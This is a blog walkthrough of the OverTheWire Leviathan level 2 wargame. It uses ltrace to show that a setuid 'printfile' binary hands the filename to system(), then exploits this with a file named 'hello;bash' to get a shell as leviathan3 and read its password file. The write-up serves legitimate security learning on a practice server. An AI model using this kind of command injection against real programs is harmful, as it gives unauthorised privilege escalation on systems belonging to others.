---
title: OverTheWire Leviathan Level 2
date: 2022-03-02 22:30:00 +0000
categories: [OverTheWire, Leviathan]
tags: [overthewire, leviathan]
description: Solution for OverTheWire Leviathan level 2 challenge
---

## Level Goal  

There is no information for this level, intentionally.

---

## Walkthrough  

Solution for the Overthewire.org [Leviathan level 2](https://overthewire.org/wargames/leviathan/leviathan2.html){:target="\_blank"}

Login to the server using the password obtained from the previous level [Leviathan level 1]({% post_url 2022-02-28-overthewire-leviathan-1 %}).  

username: `leviathan2`  

```ssh
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

With no description given first thing we do is check what is in the home directory.

```console
leviathan2@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan2@leviathan:~$ 
```

There is a executable named `printfile` that will run with leviathan3 permissions.

When running the file we find out it takes a file name as it's argument.

```console
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
```

Since it runs with `leviathan3` permissions we can try printing the password file leviathan3.

```console
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Using `ltrace` we can begin to see what the executable is doing.

```console
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                  = -1
puts("You cant have that file..."You cant have that file...
)                                                            = 27
+++ exited (status 1) +++
```

The first thing it does is call `access`. Access is used to check if the user has permission to access the given file, it also dereferences symbolic links so we cannot create a simlink to the password file.  

```text
access() 
    checks whether the calling process can access the file pathname.  
    If pathname is a symbolic link, it is dereferenced.
```

So we have seen what happens when we do not have permission to read a file, what happens when we do have the correct permission.
We create a file `sayHello` and write 'hello' to the file.
When we run `printfile` on sayHello we get the text 'hello' back.

```console
leviathan2@leviathan:/tmp/mine2$ echo "hello" > sayHello
leviathan2@leviathan:/tmp/mine2$ ls
sayHello

leviathan2@leviathan:/tmp/mine2$ ~/printfile sayHello 
hello
```

Now we can use ltrace to dig deeper into what `printfile` is doing.

```console
leviathan2@leviathan:/tmp/mine2$ ltrace ~/printfile sayHello 
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("sayHello", 4)                                             = 0
snprintf("/bin/cat hello", 511, "/bin/cat %s", "sayHello")        = 14
geteuid()                                                         = 12002
geteuid()                                                         = 12002
setreuid(12002, 12002)                                            = 0
system("/bin/cat sayHello"hello
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                            = 0
+++ exited (status 0) +++
```

We can see that the file is  

- checking if we have permission to access the file
- getting the effective uid
- setting the effective uid to leviathan3
- using system to run /bin/cat on the given file

Since the input is being passed directly to `system` it is not performing any validation.
We can pass other commands by creating files with special characters like `;` which is used to enter multiple commands in the terminal.

```console
leviathan2@leviathan:/tmp/mine2$ touch 'hello;bash'

leviathan2@leviathan:/tmp/mine2$ ~/printfile 'hello;bash' 
/bin/cat: hello: No such file or directory
leviathan3@leviathan:/tmp/mine2$ 
```

Now we have a shell as `leviathan3`, we can read the password file.

```console
leviathan3@leviathan:/tmp/min2$ cat /etc/leviathan_pass/leviathan3
Ahd*******
```
